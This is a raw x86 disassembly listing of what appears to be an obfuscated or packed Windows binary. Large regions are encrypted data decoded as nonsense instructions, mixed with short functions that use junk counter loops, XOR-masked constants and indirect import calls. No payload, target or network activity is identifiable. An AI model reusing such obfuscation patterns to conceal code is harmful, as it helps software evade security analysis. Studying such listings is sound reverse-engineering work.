  40e111:	xchg   edx,eax
  40e112:	sbb    esp,eax
  40e114:	mov    ch,0x97
  40e116:	dec    ebx
  40e117:	cmp    cl,ah
  40e119:	or     DWORD PTR [edx],ebp
  40e11b:	mov    cl,0x50
  40e11d:	add    BYTE PTR [edi+0x2cebfc07],0x8c
  40e124:	xor    DWORD PTR [ebx-0x58],edx
  40e127:	jecxz  0x40e0eb
  40e129:	cli    
  40e12a:	and    BYTE PTR [ebx-0x69ac30a9],dl
  40e130:	outs   dx,DWORD PTR ds:[esi]
  40e131:	addr16 in eax,dx
  40e133:	jge    0x40e0cc
  40e135:	ss pop ss
  40e137:	das    
  40e138:	pop    ecx
  40e139:	and    ch,bh
  40e13b:	lea    esi,[ebp+0x2b]
  40e13e:	shr    BYTE PTR ss:[ecx-0x3c],0x13
  40e143:	jg     0x40e15d
  40e145:	hlt    
  40e146:	fmulp  st(5),st
  40e148:	or     DWORD PTR [esi-0x31c8343a],0x4
  40e14f:	mov    bl,0xd0
  40e151:	mov    ebp,0x5aef03a
  40e156:	cmp    esp,edx
  40e158:	or     bh,al
  40e15a:	and    edx,DWORD PTR [ebp+edx*2-0x4b]
  40e15e:	dec    eax
  40e15f:	xor    eax,0x24b2742d
  40e164:	xor    BYTE PTR [edx],al
  40e166:	mov    ebx,0x48ff6d43
  40e16b:	xchg   ecx,eax
  40e16c:	out    0x38,al
  40e16e:	push   esp
  40e16f:	sub    ebp,DWORD PTR [edi-0x47d73194]
  40e175:	retf   0x6c59
  40e178:	push   esp
  40e179:	cdq    
  40e17a:	jecxz  0x40e10d
  40e17c:	les    esp,FWORD PTR [ebx+0x780e0f61]
  40e182:	jno    0x40e19e
  40e184:	sub    BYTE PTR [ebx-0x79],dh
  40e187:	xchg   edx,eax
  40e188:	jg     0x40e1f4
  40e18a:	in     al,dx
  40e18b:	adc    BYTE PTR [esi+ecx*1+0x43],ch
  40e18f:	(bad)  [ebp+0x77]
  40e192:	aam    0x98
  40e194:	aam    0xc
  40e196:	std    
  40e197:	test   al,0xe5
  40e199:	push   edi
  40e19a:	cdq    
  40e19b:	out    dx,eax
  40e19c:	add    al,0xd
  40e19e:	xchg   esi,eax
  40e19f:	and    al,0x82
  40e1a1:	mov    bl,0x3b
  40e1a3:	out    dx,eax
  40e1a4:	or     al,0xa6
  40e1a6:	sbb    al,0x6e
  40e1a8:	ja     0x40e168
  40e1aa:	wrmsr  
  40e1ac:	shl    BYTE PTR [eax-0x69],1
  40e1af:	push   es
  40e1b0:	mov    eax,0xe149e47c
  40e1b5:	pop    ds
  40e1b6:	test   DWORD PTR [esi+0x71121363],edi
  40e1bc:	dec    esi
  40e1bd:	and    al,BYTE PTR [ebp-0x82440e3]
  40e1c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e1c4:	(bad)  
  40e1c5:	push   ebp
  40e1c6:	mov    edi,0xcb97c6ae
  40e1cb:	out    dx,al
  40e1cc:	popf   
  40e1cd:	jnp    0x40e1ee
  40e1cf:	cld    
  40e1d0:	sub    esp,DWORD PTR [ecx-0x1ef8eb2a]
  40e1d6:	mov    al,ds:0x66b09df9
  40e1db:	out    dx,al
  40e1dc:	jmp    0x40e17d
  40e1de:	xchg   edx,eax
  40e1df:	sub    cl,BYTE PTR [esi+eiz*2+0x1b]
  40e1e3:	in     al,dx
  40e1e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e1e5:	mov    ebp,0xabd6c82
  40e1ea:	xchg   ebx,eax
  40e1eb:	jbe    0x40e24f
  40e1ed:	call   0x567:0xd1542110
  40e1f4:	xor    ah,BYTE PTR [ebx+0xd6298d6]
  40e1fa:	xchg   esi,eax
  40e1fb:	retf   
  40e1fc:	adc    BYTE PTR [edx+0x77dadb17],dh
  40e202:	sbb    BYTE PTR [ecx+0x4cdeeddf],cl
  40e208:	int3   
  40e209:	call   0xd44e:0xc20f70b9
  40e210:	mov    ch,BYTE PTR [edi+0x63f2d773]
  40e216:	push   ss
  40e217:	jle    0x40e1ce
  40e219:	dec    ebp
  40e21a:	sbb    al,0xa8
  40e21c:	sbb    BYTE PTR [esi+0x62092328],bl
  40e222:	mov    ebp,0x4c53343c
  40e227:	or     BYTE PTR [eax+0x3dcbf14],al
  40e22d:	mov    al,ds:0x11bb96dd
  40e232:	adc    BYTE PTR [esp+esi*8],0x51
  40e236:	xchg   edi,eax
  40e237:	nop
  40e238:	rcr    DWORD PTR [ecx-0x5cd491a8],cl
  40e23e:	mov    ch,0x35
  40e240:	add    BYTE PTR [edx],al
  40e242:	push   0x6c7666b1
  40e247:	sbb    al,0xac
  40e249:	xchg   ebp,eax
  40e24a:	bswap  edi
  40e24c:	int3   
  40e24d:	sti    
  40e24e:	ins    BYTE PTR es:[edi],dx
  40e24f:	outs   dx,DWORD PTR ds:[esi]
  40e250:	es scas al,BYTE PTR es:[edi]
  40e252:	sbb    DWORD PTR [ecx+edi*8],0x4
  40e256:	or     dl,BYTE PTR [ebx-0x5f]
  40e259:	xor    DWORD PTR [esi+0x5bc0f9c0],edi
  40e25f:	scas   eax,DWORD PTR es:[edi]
  40e260:	mov    cl,0x66
  40e262:	ins    BYTE PTR es:[edi],dx
  40e263:	xchg   ecx,eax
  40e264:	mov    esi,0x118c366c
  40e269:	call   0x474c7ac8
  40e26e:	xchg   edx,eax
  40e26f:	gs cmc 
  40e271:	inc    edx
  40e272:	or     cl,ah
  40e274:	pusha  
  40e275:	(bad)  
  40e276:	neg    BYTE PTR [edi]
  40e278:	add    dh,BYTE PTR [eax+0x3ec8ad0e]
  40e27e:	dec    edi
  40e27f:	xchg   esp,eax
  40e280:	in     eax,0x8f
  40e282:	push   0x22
  40e284:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e285:	(bad)  
  40e286:	cli    
  40e287:	(bad)  
  40e288:	pop    ebx
  40e289:	fwait
  40e28a:	or     ecx,DWORD PTR [eax-0x7]
  40e28d:	jns    0x40e2e9
  40e28f:	adc    BYTE PTR [ebx],bl
  40e291:	outs   dx,BYTE PTR ds:[esi]
  40e292:	nop
  40e293:	hlt    
  40e294:	add    ch,BYTE PTR [ebp+esi*4+0x6c9cba96]
  40e29b:	call   0xec1c:0xb8dfa17d
  40e2a2:	mov    DWORD PTR [ecx],edi
  40e2a4:	imul   ecx,DWORD PTR [eax-0x673872f],0xffffffab
  40e2ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e2ac:	push   ss
  40e2ad:	lods   eax,DWORD PTR ds:[esi]
  40e2ae:	fwait
  40e2af:	add    al,0xa2
  40e2b1:	(bad)  
  40e2b2:	pop    ecx
  40e2b3:	mov    ch,0xb
  40e2b5:	mov    ebp,0xb2730b6e
  40e2ba:	adc    ebp,DWORD PTR [ebx+0x56]
  40e2bd:	fistp  QWORD PTR [ebx-0x7845841c]
  40e2c3:	push   esi
  40e2c4:	call   0x1baf8757
  40e2c9:	push   ecx
  40e2ca:	(bad)  
  40e2cb:	aas    
  40e2cc:	repz into 
  40e2ce:	loop   0x40e32f
  40e2d0:	cld    
  40e2d1:	cmp    edi,DWORD PTR [esi]
  40e2d3:	push   es
  40e2d4:	cs fwait
  40e2d6:	sub    DWORD PTR [edi-0x2f],ebx
  40e2d9:	jo     0x40e2f7
  40e2db:	or     al,0xd6
  40e2dd:	fs jecxz 0x40e359
  40e2e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e2e1:	jnp    0x40e347
  40e2e3:	test   al,0x81
  40e2e5:	ss push ss
  40e2e7:	lods   al,BYTE PTR ds:[esi]
  40e2e8:	repz jecxz 0x40e312
  40e2eb:	inc    ecx
  40e2ec:	pop    esi
  40e2ed:	icebp  
  40e2ee:	stos   DWORD PTR es:[edi],eax
  40e2ef:	loopne 0x40e2ba
  40e2f1:	mov    ecx,0x82c5fce9
  40e2f6:	(bad)
  40e2fa:	stos   BYTE PTR es:[edi],al
  40e2fb:	and    BYTE PTR [esi+0x32754dd7],ah
  40e301:	daa    
  40e302:	push   edi
  40e303:	(bad)  
  40e304:	rcr    al,1
  40e306:	push   es
  40e307:	cld    
  40e308:	lock and DWORD PTR [esp+eiz*2+0x40],0x21
  40e30e:	call   0x7dfd0d92
  40e313:	lds    edi,FWORD PTR [ebp+0x4f]
  40e316:	not    DWORD PTR [ebp+0x7c]
  40e319:	xchg   ebp,eax
  40e31a:	mov    bh,0x29
  40e31c:	pop    ebp
  40e31d:	cmp    al,0xc8
  40e31f:	inc    edx
  40e320:	enter  0x79f5,0x2d
  40e324:	test   DWORD PTR [esi+0x8],0x8b8e7c3f
  40e32b:	dec    esi
  40e32c:	jg     0x40e352
  40e32e:	in     eax,0xd3
  40e330:	or     eax,0x334b8d1d
  40e335:	rol    BYTE PTR [ecx],cl
  40e337:	pop    ebp
  40e338:	hlt    
  40e339:	pop    ebx
  40e33a:	mov    eax,DWORD PTR [ebp-0xc]
  40e33d:	pop    edi
  40e33e:	pop    esi
  40e33f:	pop    ebx
  40e340:	leave  
  40e341:	ret    0x10
  40e344:	push   ebp
  40e345:	mov    ebp,esp
  40e347:	push   ecx
  40e348:	mov    DWORD PTR ds:0x433717,0x77e5
  40e352:	push   ecx
  40e353:	mov    DWORD PTR ds:0x433827,0xd96
  40e35d:	mov    eax,0xf89c8532
  40e362:	mov    DWORD PTR ds:0x4337eb,0x6f59
  40e36c:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40e373:	push   esi
  40e374:	movzx  ecx,WORD PTR ds:0x43376b
  40e37b:	mov    DWORD PTR [ebp-0x8],eax
  40e37e:	mov    ecx,DWORD PTR [ebp+0x8]
  40e381:	mov    DWORD PTR ds:0x4337bb,0x659
  40e38b:	push   edi
  40e38c:	mov    edi,0x7510854
  40e391:	not    esi
  40e393:	mov    esi,0x32729b
  40e398:	mov    DWORD PTR ds:0x433767,0x4cec
  40e3a2:	cmp    ecx,eax
  40e3a4:	mov    DWORD PTR ds:0x4337af,0x27d6
  40e3ae:	jmp    0x40e4db
  40e3b3:	cs jecxz 0x40e357
  40e3b6:	add    eax,0xf1aa4571
  40e3bb:	push   0x47
  40e3bd:	popf   
  40e3be:	(bad)  
  40e3bf:	out    dx,al
  40e3c0:	push   edx
  40e3c1:	retf   0x3fe2
  40e3c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e3c5:	jle    0x40e445
  40e3c7:	push   cs
  40e3c8:	jg     0x40e448
  40e3ca:	jle    0x40e34c
  40e3cc:	dec    eax
  40e3cd:	xor    bl,bl
  40e3cf:	xor    BYTE PTR [eax+edx*4],0x2
  40e3d3:	pop    DWORD PTR [ebx-0x195e8c34]
  40e3d9:	push   0x939fa005
  40e3de:	aas    
  40e3df:	into   
  40e3e0:	inc    edi
  40e3e1:	add    edi,DWORD PTR [eax-0x6d]
  40e3e4:	es or  al,0x64
  40e3e7:	hlt    
  40e3e8:	ror    BYTE PTR [esp+edx*4],1
  40e3eb:	jp     0x40e3ce
  40e3ed:	or     al,0x76
  40e3ef:	lahf   
  40e3f0:	dec    ebx
  40e3f1:	adc    edi,DWORD PTR [edx]
  40e3f3:	and    dl,BYTE PTR [ecx-0x42]
  40e3f6:	retf   0x6c76
  40e3f9:	push   ebx
  40e3fa:	and    BYTE PTR [esi],dh
  40e3fc:	xchg   edi,eax
  40e3fd:	mov    ebx,0xc416752b
  40e402:	stc    
  40e403:	push   edx
  40e404:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e405:	sbb    al,ch
  40e407:	add    eax,0xeedbc33
  40e40c:	xchg   edi,eax
  40e40d:	addr16 mov esi,0xf6f6f0c1
  40e413:	les    eax,FWORD PTR [esi+ebp*4]
  40e416:	pop    ecx
  40e417:	and    DWORD PTR [edi+edx*2-0x60],0xb97af7c0
  40e41f:	xchg   esp,eax
  40e420:	pop    ecx
  40e421:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e422:	jp     0x40e43a
  40e424:	cmp    DWORD PTR [edi+edi*2],edx
  40e427:	hlt    
  40e428:	pop    edx
  40e429:	test   edx,0x73ac5f30
  40e42f:	or     esp,DWORD PTR [esi]
  40e431:	dec    esp
  40e432:	mov    bh,BYTE PTR fs:[eax]
  40e435:	std    
  40e436:	cs push esi
  40e438:	pop    eax
  40e439:	sub    al,BYTE PTR [eax-0x51]
  40e43c:	dec    esp
  40e43d:	scas   eax,DWORD PTR es:[edi]
  40e43e:	push   cs
  40e43f:	jle    0x40e418
  40e441:	dec    edx
  40e442:	call   0xe954996f
  40e447:	xchg   ebp,eax
  40e448:	int    0x1a
  40e44a:	sbb    al,0xec
  40e44c:	sub    esp,DWORD PTR [ebx-0x6cc7238]
  40e452:	adc    eax,DWORD PTR [edx]
  40e454:	sub    ecx,esp
  40e456:	in     al,dx
  40e457:	fmul   QWORD PTR [ebx-0x3f239c9d]
  40e45d:	adc    BYTE PTR ds:0xc4ab21e4,0xf6
  40e464:	jmp    0x40e461
  40e466:	loope  0x40e4e4
  40e468:	mov    dl,0x9b
  40e46a:	(bad)  
  40e46b:	xor    al,0xc6
  40e46d:	sbb    edi,esp
  40e46f:	ret    0xd135
  40e472:	daa    
  40e473:	nop
  40e474:	leave  
  40e475:	adc    DWORD PTR [esi-0x2a],esi
  40e478:	dec    eax
  40e479:	xlat   BYTE PTR ds:[ebx]
  40e47a:	ficomp DWORD PTR [ecx]
  40e47c:	dec    ebx
  40e47d:	bound  eax,QWORD PTR [ebp-0x1c]
  40e480:	cmp    dl,BYTE PTR [esi-0x39]
  40e483:	(bad)  
  40e484:	shl    DWORD PTR [eax+edi*4],0xd2
  40e488:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e489:	push   edx
  40e48a:	fsubr  QWORD PTR [ebx+ecx*4-0x6f65cd0e]
  40e491:	outs   dx,DWORD PTR ds:[esi]
  40e492:	or     edi,DWORD PTR [edi+0x71625024]
  40e498:	pop    ebp
  40e499:	mov    dh,BYTE PTR [edx+0x48]
  40e49c:	fnsave [esp+ebx*4+0x14940c53]
  40e4a3:	push   0x9c50ecb2
  40e4a8:	mov    eax,0x2db6006
  40e4ad:	mov    gs,WORD PTR [esi-0x18]
  40e4b0:	mov    esp,0xa725144d
  40e4b5:	pop    ebp
  40e4b6:	jne    0x40e46b
  40e4b8:	aaa    
  40e4b9:	stc    
  40e4ba:	push   0x15337e21
  40e4bf:	dec    edi
  40e4c0:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  40e4c2:	loop   0x40e4d9
  40e4c4:	stos   DWORD PTR es:[edi],eax
  40e4c5:	ret    0xd99c
  40e4c8:	push   ds
  40e4c9:	test   DWORD PTR [edi+eiz*2+0x46189d6],0x5f6fe319
  40e4d4:	shl    DWORD PTR [edi-0x56914040],cl
  40e4da:	jnp    0x40e4eb
  40e4dc:	test   dl,bh
  40e4de:	add    DWORD PTR [eax],eax
  40e4e0:	add    BYTE PTR [ecx+0x43383305],al
  40e4e6:	add    BYTE PTR [ebp-0x74ffffce],bh
  40e4ec:	inc    ebp
  40e4ed:	cld    
  40e4ee:	mov    ecx,DWORD PTR [ebp+0xc]
  40e4f1:	xor    DWORD PTR ds:0x433717,0x4337bf
  40e4fb:	xor    eax,edi
  40e4fd:	add    eax,esi
  40e4ff:	cmp    eax,ecx
  40e501:	mov    DWORD PTR ds:0x433833,0x147f
  40e50b:	je     0x40e6db
  40e511:	and    DWORD PTR ds:0x4337a7,0x0
  40e51b:	jmp    0x40e52b
  40e520:	mov    eax,ds:0x4337a7
  40e525:	inc    eax
  40e526:	mov    ds:0x4337a7,eax
  40e52b:	cmp    DWORD PTR ds:0x4337a7,0x13
  40e532:	jae    0x40e568
  40e538:	cmp    DWORD PTR ds:0x4337a7,0x9
  40e53f:	jne    0x40e54b
  40e545:	call   DWORD PTR ds:0x412030
  40e54b:	cmp    DWORD PTR ds:0x4337a7,0x8
  40e552:	jne    0x40e563
  40e558:	mov    eax,ds:0x4337a7
  40e55d:	inc    eax
  40e55e:	mov    ds:0x4337a7,eax
  40e563:	jmp    0x40e520
  40e568:	mov    eax,DWORD PTR [ebp-0x4]
  40e56b:	sub    edx,DWORD PTR ds:0x4337bb
  40e571:	xor    eax,edi
  40e573:	dec    edx
  40e574:	add    eax,esi
  40e576:	push   eax
  40e577:	adc    DWORD PTR ds:0x4337b3,0x52cc
  40e581:	push   DWORD PTR [ebp-0x8]
  40e584:	or     DWORD PTR ds:0x43377b,edx
  40e58a:	push   DWORD PTR [ebp-0x4]
  40e58d:	mov    edx,DWORD PTR ds:0x413bde
  40e593:	call   0x406864
  40e598:	mov    ecx,DWORD PTR ds:0x413bde
  40e59e:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40e5a4:	mov    DWORD PTR [ecx],eax
  40e5a6:	mov    eax,DWORD PTR [ebp-0x8]
  40e5a9:	jmp    0x40e840
  40e5ae:	jmp    0x40e6db
  40e5b3:	xor    dl,BYTE PTR [ebp-0x2e]
  40e5b6:	fs jno 0x40e61a
  40e5b9:	mov    al,0x51
  40e5bb:	sti    
  40e5bc:	adc    eax,0x38c39328
  40e5c1:	cmp    eax,0x7ea5cf4a
  40e5c6:	jle    0x40e5d6
  40e5c8:	jg     0x40e648
  40e5ca:	jle    0x40e5c3
  40e5cc:	in     al,0x16
  40e5ce:	sahf   
  40e5cf:	shr    DWORD PTR [edx+edx*2+0x55637483],1
  40e5d6:	adc    BYTE PTR [eax+0x7734656],ch
  40e5dc:	and    dl,BYTE PTR [edi]
  40e5de:	leave  
  40e5df:	push   cs
  40e5e0:	sbb    eax,0x6cb60b79
  40e5e5:	int3   
  40e5e6:	fstp   QWORD PTR [ebp-0x68d3b444]
  40e5ec:	loop   0x40e5cf
  40e5ee:	pop    esp
  40e5ef:	lods   al,BYTE PTR ds:[esi]
  40e5f0:	push   ss
  40e5f1:	neg    DWORD PTR [ecx-0x25cb2f09]
  40e5f7:	stc    
  40e5f8:	dec    eax
  40e5f9:	push   edi
  40e5fa:	inc    ebx
  40e5fb:	mov    ds:0x37d818d2,eax
  40e600:	bswap  ebp
  40e602:	test   DWORD PTR [edx+0x6c],esi
  40e605:	push   ecx
  40e606:	aas    
  40e607:	and    BYTE PTR [edi+eiz*4-0x895854a],al
  40e60e:	call   0x647a:0xa7d5a603
  40e615:	sbb    bh,BYTE PTR [ebx-0x59]
  40e618:	jb     0x40e624
  40e61a:	add    al,0x80
  40e61c:	mov    ch,BYTE PTR [ecx-0x61]
  40e61f:	mov    ss,WORD PTR [edx-0x24b60637]
  40e625:	das    
  40e626:	pop    ecx
  40e627:	xor    WORD PTR [ebp+0x34a4dd9e],sp
  40e62e:	rcr    esi,0x8
  40e631:	xor    eax,0xd08408ab
  40e636:	clc    
  40e637:	inc    esp
  40e638:	out    dx,al
  40e639:	mov    edi,0x71a28caf
  40e63e:	cmc    
  40e63f:	(bad)  
  40e640:	mov    ebx,0x2a9e1ea9
  40e645:	mov    dl,0x3f
  40e647:	adc    al,0x45
  40e649:	(bad)  
  40e64a:	fcom   QWORD PTR [edi]
  40e64c:	xchg   esp,eax
  40e64d:	cmc    
  40e64e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e64f:	mov    ecx,0x35ecd123
  40e654:	imul   ecx,edi,0xffffffa7
  40e657:	jo     0x40e6cc
  40e659:	add    DWORD PTR [esi],eax
  40e65b:	jle    0x40e65e
  40e65d:	and    BYTE PTR ds:0xa7ea8a48,dl
  40e663:	mov    dl,0x24
  40e665:	mov    dl,0x6c
  40e667:	aaa    
  40e668:	mov    ds:0x35d1e1d3,al
  40e66d:	fist   WORD PTR [edi]
  40e670:	imul   esi,DWORD PTR [ebp-0x21],0xffffffdf
  40e674:	mov    bh,bl
  40e676:	inc    esp
  40e677:	in     eax,0x63
  40e679:	cli    
  40e67a:	retf   
  40e67b:	cwde   
  40e67c:	mov    bl,0xb3
  40e67e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e67f:	jns    0x40e64d
  40e681:	shl    DWORD PTR [ebp-0x2bc8ca],cl
  40e687:	arpl   si,di
  40e689:	jb     0x40e650
  40e68b:	and    al,0x95
  40e68d:	adc    BYTE PTR [esi-0x1f1caeaa],bh
  40e693:	sbb    ebx,DWORD PTR [edi+0x74222e2b]
  40e699:	cmc    
  40e69a:	ins    BYTE PTR es:[edi],dx
  40e69b:	idiv   BYTE PTR [ebx+0x59]
  40e69e:	add    esp,edi
  40e6a0:	jge    0x40e6ab
  40e6a2:	call   0x8388:0x5686c7bd
  40e6a9:	inc    edi
  40e6aa:	jno    0x40e691
  40e6ac:	je     0x40e637
  40e6ae:	jb     0x40e6b9
  40e6b0:	pop    ecx
  40e6b1:	inc    edx
  40e6b2:	lahf   
  40e6b3:	jno    0x40e669
  40e6b5:	loopne 0x40e6d3
  40e6b7:	rol    DWORD PTR [ecx],cl
  40e6b9:	xor    bl,BYTE PTR [edx]
  40e6bb:	xor    eax,0x317eaa59
  40e6c0:	rcl    dl,1
  40e6c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e6c3:	ficom  DWORD PTR [esi]
  40e6c5:	fst    DWORD PTR [ebp-0x57]
  40e6c8:	mov    esi,0xd7c49690
  40e6cd:	mov    esi,?
  40e6cf:	add    DWORD PTR [eax],edx
  40e6d1:	and    eax,0x4a15cf53
  40e6d6:	scas   eax,DWORD PTR es:[edi]
  40e6d7:	pop    ecx
  40e6d8:	jecxz  0x40e74a
  40e6da:	inc    eax
  40e6db:	mov    eax,DWORD PTR [ebp-0x4]
  40e6de:	mov    ecx,DWORD PTR [ebp+0x10]
  40e6e1:	xor    eax,edi
  40e6e3:	add    eax,esi
  40e6e5:	cmp    eax,ecx
  40e6e7:	jne    0x40e83d
  40e6ed:	mov    eax,DWORD PTR [ebp-0x4]
  40e6f0:	xor    eax,edi
  40e6f2:	add    eax,esi
  40e6f4:	jmp    0x40e821
  40e6f9:	xor    BYTE PTR [ebx+0x7369636a],al
  40e6ff:	xor    DWORD PTR [ecx+0x23],edx
  40e702:	mov    ebp,0xa36f30a1
  40e707:	cmp    ebp,ecx
  40e709:	fbld   TBYTE PTR [edx+0x7f0e7e7e]
  40e70f:	jle    0x40e78f
  40e711:	stc    
  40e712:	push   esi
  40e713:	or     al,0x39
  40e715:	mov    eax,ds:0x28446abf
  40e71a:	mov    cl,0x1d
  40e71c:	and    BYTE PTR [edi+0x3d6ceefc],cl
  40e722:	lea    esi,[ebx]
  40e724:	inc    esp
  40e725:	repz sub bh,ah
  40e728:	lods   al,BYTE PTR ds:[esi]
  40e729:	pop    esi
  40e72a:	shr    BYTE PTR [esi+0x6],0x8f
  40e72e:	pop    eax
  40e72f:	mov    edx,0x58ff8237
  40e734:	jmp    0x40e76f
  40e736:	out    0xe1,al
  40e738:	out    0x73,eax
  40e73a:	jmp    0x3bb2:0x88417507
  40e741:	and    dl,BYTE PTR [edi+0x7]
  40e744:	mov    ecx,0x44b9e2b5
  40e749:	fcom   st(1)
  40e74b:	inc    edx
  40e74c:	test   eax,0x8471691b
  40e751:	dec    ebp
  40e752:	mov    DWORD PTR [esi],ebx
  40e754:	or     ecx,0x2d
  40e757:	out    0x50,al
  40e759:	or     DWORD PTR [edi+0x27],eax
  40e75c:	out    0x17,al
  40e75e:	jne    0x40e713
  40e760:	je     0x40e78b
  40e762:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e763:	jne    0x40e6f7
  40e765:	(bad)  
  40e766:	jne    0x40e723
  40e768:	in     al,0xe6
  40e76a:	das    
  40e76b:	aad    0xca
  40e76d:	outs   dx,DWORD PTR ds:[esi]
  40e76e:	inc    ecx
  40e76f:	(bad)  
  40e771:	dec    ecx
  40e772:	test   DWORD PTR [edi+0x24cb30ce],esp
  40e778:	imul   esp,ebx,0x6be465f6
  40e77e:	sbb    ebp,esi
  40e780:	mov    ecx,0xf18f7273
  40e785:	sbb    cl,BYTE PTR [ebx-0x33]
  40e788:	into   
  40e789:	(bad)
  40e78c:	into   
  40e78d:	clc    
  40e78e:	push   esp
  40e78f:	jmp    0xf21b58b8
  40e794:	hlt    
  40e795:	jno    0x40e730
  40e797:	cmp    BYTE PTR [ebx],al
  40e799:	pop    eax
  40e79a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e79c:	xlat   BYTE PTR ds:[ebx]
  40e79d:	mov    ebx,0x10cf5e2d
  40e7a2:	addr16 pop edx
  40e7a4:	push   cs
  40e7a5:	inc    eax
  40e7a6:	cdq    
  40e7a7:	push   eax
  40e7a8:	in     eax,dx
  40e7a9:	jne    0x40e734
  40e7ab:	in     eax,0x38
  40e7ad:	push   ecx
  40e7ae:	imul   si,WORD PTR [edx-0x7757f023],0x21
  40e7b6:	(bad)
  40e7b9:	mov    edx,0xc2355e02
  40e7be:	fistp  QWORD PTR [edx-0x20]
  40e7c1:	and    DWORD PTR [ebx+0x7bb70f25],ebx
  40e7c7:	adc    BYTE PTR [esi],0xfd
  40e7ca:	xchg   DWORD PTR [ebp-0x49],ecx
  40e7cd:	mov    ?,ebp
  40e7cf:	in     al,dx
  40e7d0:	ins    DWORD PTR es:[edi],dx
  40e7d1:	repnz addr16 mov eax,0x6176dbfb
  40e7d8:	sub    al,0xc
  40e7da:	(bad)  
  40e7db:	sub    eax,DWORD PTR fs:[esi-0x749ce248]
  40e7e2:	cmp    dh,BYTE PTR [eax-0x68]
  40e7e5:	and    BYTE PTR [esi+edx*8-0x322079bd],ah
  40e7ec:	xchg   esi,eax
  40e7ed:	mov    bh,0x7f
  40e7ef:	dec    eax
  40e7f0:	popa   
  40e7f1:	sahf   
  40e7f2:	loope  0x40e7b0
  40e7f4:	push   esi
  40e7f5:	mov    eax,0xe2e3c56b
  40e7fa:	inc    edx
  40e7fb:	retf   0xea54
  40e7fe:	mov    edi,0xace31ee8
  40e803:	cmc    
  40e804:	pop    edi
  40e805:	mov    ecx,0x210adb6f
  40e80a:	mov    ds:0x3c99a799,eax
  40e80f:	xlat   BYTE PTR ds:[ebx]
  40e810:	iret   
  40e811:	jmp    0x40e84d
  40e813:	dec    ecx
  40e814:	(bad)  
  40e815:	mov    cl,0x27
  40e817:	mov    ds:0x3aa05fb1,eax
  40e81c:	push   edi
  40e81e:	jns    0x40e85e
  40e820:	jg     0x40e7c5
  40e822:	bound  edi,QWORD PTR [ecx+eax*2]
  40e825:	add    BYTE PTR [ebx-0x38cc03bb],cl
  40e82b:	add    eax,esi
  40e82d:	mov    ds:0x413c5a,eax
  40e832:	push   DWORD PTR [ebp-0x8]
  40e835:	push   DWORD PTR [ebp-0x4]
  40e838:	call   0x40e84a
  40e83d:	mov    eax,DWORD PTR [ebp-0x4]
  40e840:	xor    eax,edi
  40e842:	pop    edi
  40e843:	add    eax,esi
  40e845:	pop    esi
  40e846:	leave  
  40e847:	ret    0xc
  40e84a:	push   ebp
  40e84b:	mov    ebp,esp
  40e84d:	sub    esp,0x60
  40e850:	mov    eax,DWORD PTR [ebp+0x8]
  40e853:	push   ebx
  40e854:	and    DWORD PTR ds:0x43383f,0x0
  40e85e:	jmp    0x40e870
  40e863:	mov    ebx,DWORD PTR ds:0x43383f
  40e869:	inc    ebx
  40e86a:	mov    DWORD PTR ds:0x43383f,ebx
  40e870:	cmp    DWORD PTR ds:0x43383f,0x19
  40e877:	jae    0x40e8a2
  40e87d:	cmp    DWORD PTR ds:0x43383f,0x1e
  40e884:	jne    0x40e893
  40e88a:	push   DWORD PTR [ebp-0x14]
  40e88d:	call   DWORD PTR ds:0x412034
  40e893:	jmp    0x40e863
  40e898:	sub    DWORD PTR ds:0x4337bf,0x283f
  40e8a2:	push   esi
  40e8a3:	and    DWORD PTR ds:0x4337ff,0x0
  40e8ad:	mov    esi,DWORD PTR ds:0x4337ff
  40e8b3:	inc    esi
  40e8b4:	mov    DWORD PTR ds:0x4337ff,esi
  40e8ba:	cmp    DWORD PTR ds:0x4337ff,0x10
  40e8c1:	jne    0x40e8d5
  40e8c7:	push   0x43377f
  40e8cc:	push   DWORD PTR [ebp-0x28]
  40e8cf:	call   DWORD PTR ds:0x4123ac
  40e8d5:	cmp    DWORD PTR ds:0x4337ff,0xf
  40e8dc:	jne    0x40e8ef
  40e8e2:	mov    esi,DWORD PTR ds:0x4337ff
  40e8e8:	inc    esi
  40e8e9:	mov    DWORD PTR ds:0x4337ff,esi
  40e8ef:	cmp    DWORD PTR ds:0x4337ff,0x1a
  40e8f6:	jb     0x40e8ad
  40e8fc:	mov    DWORD PTR ds:0x4337f7,0x1e
  40e906:	cmp    DWORD PTR ds:0x4337f7,0x0
  40e90d:	je     0x40e960
  40e913:	cmp    DWORD PTR ds:0x4337f7,0xc
  40e91a:	jne    0x40e933
  40e920:	push   0x6d58
  40e925:	push   DWORD PTR [ebp-0x20]
  40e928:	push   0x30b0
  40e92d:	call   DWORD PTR ds:0x4121e0
  40e933:	cmp    DWORD PTR ds:0x4337f7,0xd
  40e93a:	jne    0x40e94d
  40e940:	mov    ebx,DWORD PTR ds:0x4337f7
  40e946:	dec    ebx
  40e947:	mov    DWORD PTR ds:0x4337f7,ebx
  40e94d:	mov    ebx,DWORD PTR ds:0x4337f7
  40e953:	dec    ebx
  40e954:	mov    DWORD PTR ds:0x4337f7,ebx
  40e95a:	jmp    0x40e906
  40e95f:	dec    esi
  40e960:	mov    esi,0x7510854
  40e965:	xor    eax,esi
  40e967:	mov    ebx,0x32729b
  40e96c:	add    eax,ebx
  40e96e:	and    DWORD PTR ds:0x4337a7,0x3e06
  40e978:	push   edi
  40e979:	neg    DWORD PTR ds:0x43372b
  40e97f:	mov    DWORD PTR [ebp-0x18],eax
  40e982:	and    DWORD PTR ds:0x43371b,0x0
